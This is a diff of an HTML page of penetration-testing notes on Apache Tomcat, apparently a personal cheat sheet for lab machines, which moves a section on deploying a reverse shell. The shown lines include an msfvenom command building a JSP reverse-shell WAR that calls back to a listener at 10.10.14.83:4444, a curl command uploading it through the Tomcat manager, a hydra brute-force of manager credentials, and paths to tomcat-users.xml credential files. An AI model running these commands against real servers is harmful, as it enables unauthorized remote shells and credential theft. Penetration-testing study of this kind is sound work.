@@ -986,6 +986,16 @@ layout: default
 		<li>AJP / port 8009</li>
 	</ul>
 
+	<li>Deploy .war reverse shell</li>
+	<ul>
+		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war &gt; shell.war</li>
+		<li>manager-gui - /manager/html/</li>
+		<li>manager-script - /manager/text/</li>
+		<ul>
+			<li>curl -u &apos;&lt;username&gt;:&lt;password&gt;&apos; http://10.129.241.149:8080/manager/text/deploy?path=/shell --upload-file shell.war</li>
+		</ul>
+	</ul>
+
 	<li>Brute force tomcat credentials</li>
 	<ul>
 		<li>hydra -L words.lst -P words.lst http-get://10.0.0.25:8080/host-manager/html</li>
@@ -1002,7 +1012,7 @@ layout: default
 				<li>/usr/share/tomcat9/etc/tomcat-users.xml</li>
 				<li>/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml</li>
 			</ul>
-			
+
 		<li>/usr/lib/systemd/system/tomcat9.service</li>
 		<ul>
 			<li>Will show CATALINA_HOME and CATALINA_BASE variables</li>
@@ -1012,16 +1022,6 @@ layout: default
 		<ul>
 			<li>Search apache version + Ubuntu to find the ubuntu distribution that is most likely running on the box.  Then google the distribution name + tomcat in order to find the tomcat file directories installed on the box.</li>
 			<li>Install tomcat and search for the location on your own box.  Example: <code>sudo apt install tomcat9</code></li>
-		</ul>
-	</ul>
-
-	<li>Deploy .war reverse shell</li>
-	<ul>
-		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war &gt; shell.war</li>
-		<li>manager-gui - /manager/html/</li>
-		<li>manager-script - /manager/text/</li>
-		<ul>
-			<li>curl -u &apos;&lt;username&gt;:&lt;password&gt;&apos; http://10.129.241.149:8080/manager/text/deploy?path=/shell --upload-file shell.war</li>
 		</ul>
 	</ul>
 
